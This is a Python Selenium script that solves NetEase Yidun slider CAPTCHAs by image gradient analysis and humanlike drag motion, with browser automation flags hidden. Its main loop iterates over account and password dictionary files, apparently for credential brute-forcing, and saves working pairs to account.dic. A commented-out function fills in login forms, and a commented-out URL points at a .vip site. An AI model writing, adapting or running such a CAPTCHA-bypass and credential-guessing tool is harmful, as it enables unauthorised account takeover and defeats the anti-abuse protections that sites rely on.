import random
from selenium.webdriver import ActionChains
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from PIL import Image
import numpy as np
from scipy import signal
import requests
import time
import matplotlib.pylab as plt
import base64
import calendar
import argparse
from imutils import paths
import os
from PIL import Image
from PIL import ImageChops
import shutil
import hashlib
    
background_path = 'background.png'
slider_path = 'slider.png'
offset=-8



def valid_test_img_show(img, distance):
    plt.figure
    plt.imshow(img)
    plt.axvline(distance, color="r")
    plt.savefig("imgs/valid.png")
    # plt.show()


def get_boundary(array):
    grad = np.array(array > 0)
    h, w = grad.shape
    # img_show(grad)
    rows_sum = np.sum(grad, axis=1)
    cols_sum = np.sum(grad, axis=0)
    left, top, bottom = 0, 0, h
    # get the top index
    p = np.max(rows_sum) * 0.5
    for i in range(h):
        if rows_sum[i] > p:
            top = i
            break
    for i in range(h - 1, -1, -1):
        if rows_sum[i] > p:
            bottom = i
            break
    p = np.max(cols_sum) * 0.5
    for i in range(w):
        if cols_sum[i] > p:
            left = i
            break
    return top, bottom + 1, left


def get_tracks(distance):
    v = random.randint(0, 2)
    t = 0.1
    tracks = []
    cur = 0
    mid = distance * 0.8
    while cur < distance:
        if cur < mid:
            a = random.randint(2, 4)
        else:
            a = -random.randint(3, 5)
        s = v * t + 0.5 * a * t ** 2
        cur += s
        v = v + a * t
        tracks.append(round(s))
    tracks.append(distance - sum(tracks))
    return tracks





def download_img(driver, selenium_item,path, size):

    url = selenium_item.get_attribute("src")

    if url is not None:
        response = requests.get(url)
        with open(path, "wb") as f:
            f.write(response.content)
        img = Image.open(path).resize(size)
        img.save(path)
        img.close()

    # use js to download picture
    else:
        class_name = selenium_item.get_attribute("class")
        # 下面的js代码根据canvas文档说明而来
        js_cmd = (
            'return document.getElementsByClassName("%s")[0].toDataURL("image/png");'
            % class_name
        )
        # 执行 JS 代码并拿到图片 base64 数据
        im_info = driver.execute_script(js_cmd)  # 执行js文件得到带图片信息的图片数据
        im_base64 = im_info.split(",")[1]  # 拿到base64编码的图片信息
        im_bytes = base64.b64decode(im_base64)  # 转为bytes类型
        with open(path, "wb") as f:  # 保存图片到本地
            f.write(im_bytes)
        img = Image.open(path).resize(size)
        img.save(path)
        img.close()
    


def download_images(driver,background_item,slider_item,rtime):

    backgroud_size = (
        background_item.size["width"], background_item.size["height"]
    )
    slider_size = slider_item.size["width"], slider_item.size["height"]
    #slider_size = 61, 160
    print(slider_size)
    print(backgroud_size)
    download_img(driver,background_item, background_path, backgroud_size)
    download_img(driver,slider_item, 'imgs/'+rtime+'_'+slider_path, slider_size)
  

def is_image_file(self,filename):
    return any(filename.endswith(extension) for extension in ['.png', '.jpg', '.jpeg', '.PNG', '.JPG', '.JPEG'])




def imageCompare(imagePath):

    dataset_dir='imgs/'
    # 使用imutils.paths模块中的list_images()方法可以获取当前目录下的图片路径
    imagePaths=sorted(list(paths.list_images(dataset_dir)))
    with open(imagePath, 'rb') as fp1:
            data1 = fp1.read()
    file_md51= hashlib.md5(data1).hexdigest()
    print(file_md51)
    print('=====11111111111====')
    for image_filename in imagePaths:

        if imagePath not in  image_filename:

            with open(image_filename, 'rb') as fp2:

                data2 = fp2.read()
            file_md52= hashlib.md5(data2).hexdigest()
      
            print(file_md52)
            if file_md51==file_md52:
             
                print(image_filename)
                return image_filename
    return "F"


def get_distance_by_default(rtime,offset,background_item,slider_item):

    download_images(driver,background_item,slider_item,rtime)
    res=imageCompare('imgs/'+rtime+'_'+slider_path)
    
    if res!='F':
 
        f = open("distince_data.dic")
        lines = f.readlines()
        for line in lines:
            
            dis=line.replace('\n','').split('|')
            print(res)
            print(dis[0])
            if  dis[0] in (res):
                print('distince:'+dis[1])
                return int(dis[1])
    # load the picture
    backgroud_img = Image.open(background_path).convert("L")
    slider_img = Image.open('imgs/'+rtime+'_'+slider_path).convert("L")
    backgroud_img = np.array(backgroud_img)
    slider_img = np.array(slider_img)
    # covld
    top, bottom, left = get_boundary(slider_img)
    scharr = np.array([[-6, 0, +6], [-6, 0, +6], [-6, 0, +6]])
    grad = signal.correlate2d(
        backgroud_img[top:bottom, :], scharr, boundary="symm", mode="same"
    )
    # 得到距离
    cols_sum = np.sum(grad, axis=0)
    # desc
    sorted_sum = np.argsort(-np.abs(cols_sum))
    distance = np.min(sorted_sum[:4])

    return distance + offset - left+3

def runData(driver):
    #rs=crack_slider(driver,account,passwd)
    wait = WebDriverWait(driver, 5)
    time.sleep(2)
    driver.refresh()
    # 点击对应标签
    button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'body > main > div.g-bd > div > div.g-mn2 > div.m-tcapt > ul > li:nth-child(2)')))
    button.click()
    tc_item = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '.yidun_intelli-tips')))
    tc_item.click()



# def runData(driver,account,passwd):
#     #rs=crack_slider(driver,account,passwd)
#     time.sleep(2)
#     driver.delete_all_cookies()
#     driver.refresh()
#     time.sleep(3)
#     submit = driver.find_element(By.XPATH,'//*[@id="root"]/div[1]/div/div[1]/img[3]')
#     submit.click()
#     time.sleep(2)
#     username = driver.find_element(By.XPATH,'//*[@id="root"]/div[2]/div/div[2]/input[1]')  # 寻找账号输入框
#     username.clear()
#     username.send_keys(account)  # 填入用户名 
#     password = driver.find_element(By.XPATH,'//*[@id="root"]/div[2]/div/div[2]/input[2]') # 寻找密码输入框
#     password.clear()
#     password.send_keys(passwd)  # 填入密码
#     submit = driver.find_element(By.XPATH,'//*[@id="root"]/div[2]/div/div[2]/span')
#     submit.click()
#     time.sleep(3)
    

def run(driver):
    time.sleep(3)
   
    wait = WebDriverWait(driver, 5)
    background_item = wait.until(
        EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_bg-img"))
    )
    slider_item = wait.until(
        EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_jigsaw"))
    )

    resr=''
    fore = random.randint(10, 18)

    try:
        distance=0
        ts=calendar.timegm(time.gmtime())

        distance = get_distance_by_default(str(ts),offset,background_item,slider_item)
        resr=str(ts)+'_'+slider_path+'|'+str(distance)
        mysetp=20
        if distance>60 and  distance<=80:
            mysetp=27
        if distance>80 and distance<=120:
            mysetp=37
        elif distance>120 and distance<=160:
            mysetp=57
        elif distance>160:
            mysetp=77
   
        distance=distance-2*mysetp
       
        try:
            tracks = get_tracks(distance + fore)
            print(resr)
            print(str(mysetp))
            # 开始滑动

            slider_btn = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "[class='yidun_slider__icon']")))

            ActionChains(driver).click_and_hold(slider_btn).perform()
            print('================================')
            time.sleep(random.randint(1, 10) * 0.1)
          
            list=[0,1,1,mysetp,mysetp]
            for ll in list:
               ActionChains(driver,duration=5).move_by_offset(ll, 0).perform()
            
            print('||||')
      
            for t in tracks:
                ActionChains(driver,duration=5).move_by_offset(t, 0).perform()
   
            time.sleep(random.randint(1, 5) * 0.1)
            for t in range(1,3):
              
                ActionChains(driver,duration=5).move_by_offset(-3, 0).perform()
                time.sleep(random.randint(1, 5) * 0.1)

            slider_btn = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "[class='yidun_slider__icon']")))
            ActionChains(driver).click(slider_btn)
            print('----------')
            ActionChains(driver).release(on_element=None).perform()

            time.sleep(2)
        except Exception as e:
        
            print(e)
            pass
        try:
            handlers = driver.window_handles
            for winHandler in handlers:
                driver.switch_to.default_content()            
            time.sleep(3)
            res=''
            
            if driver.find_element(By.XPATH,'//*[@id="body_container"]/div[*]/div/div/p[1]/img')!='':
                
                res=driver.find_element(By.CLASS_NAME,'msg__5sckD').get_attribute('textContent')
                driver.find_element(By.XPATH,'//*[@id="body_container"]/div[*]/div/div/p[1]/img').click()
                time.sleep(2)
                print('存储拖动距离.....')
                with open("distince_data.dic", "a") as f1:  # 保存图片到本地
                    f1.write(resr+'\n')
                f1.close()
            print(res)
   
            if u'账号密码' in res :
                return "F"
        except Exception as e:
            handlers = driver.window_handles
            for winHandler in handlers:
                driver.switch_to.default_content()            
            time.sleep(3)
            res=''
            
            if driver.find_element(By.XPATH,'//*[@id="root"]/div[1]/div/div[2]')!='':
                print('存储拖动距离.....')
                print(resr)
                with open("distince_data.dic", "a") as f1:  # 保存图片到本地
                    f1.write(resr+'\n')
                f1.close()
                
                return "T"
        return "F"
    except Exception as e:
     
        res=driver.find_element(By.CSS_SELECTOR, "[class='yidun_tips__text yidun-fallback__tip']").get_attribute('textContent')
        
        print(res)
        if res=='验证成功':
            print('存储拖动距离.....')
            with open("distince_data.dic", "a") as f1:  # 保存图片到本地
                f1.write(resr+'\n')
            f1.close()
        runData(driver)
        run(driver)
        
           

   

if __name__ == "__main__":
      
    #TEST_URL = "https://8083331.vip/"
    TEST_URL = "http://dun.163.com/trial/sense"
    options = webdriver.ChromeOptions()
    #options.add_argument("start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option('excludeSwitches', ['enable-automation'])
    options.add_experimental_option('useAutomationExtension', False)

    driver = webdriver.Chrome(
        options=options
    )

    driver.get(TEST_URL)
    count=1
    global countLines
    readlines = len(open('data.dic','r').readlines())
    accounts = open('data.dic')
  
    userCount=0

    for account in accounts:
  
        passwds = open('dic.dic')
        userCount=userCount+1
        #count=1
        for passwd in passwds:
            account = account.strip()
            passwd = passwd.strip()
            print("当前第"+str(userCount)+"条数据,"+account+"|"+passwd)
            #runData(driver,account,passwd)
            runData(driver)
            result=run(driver)
            count=2
            #icount=icount+1
            print(result)
            if result=='T':
                with open("account.dic", "a") as f: 
                    f.write(account+'|'+passwd+'\n')
                f.close()
    driver.close()
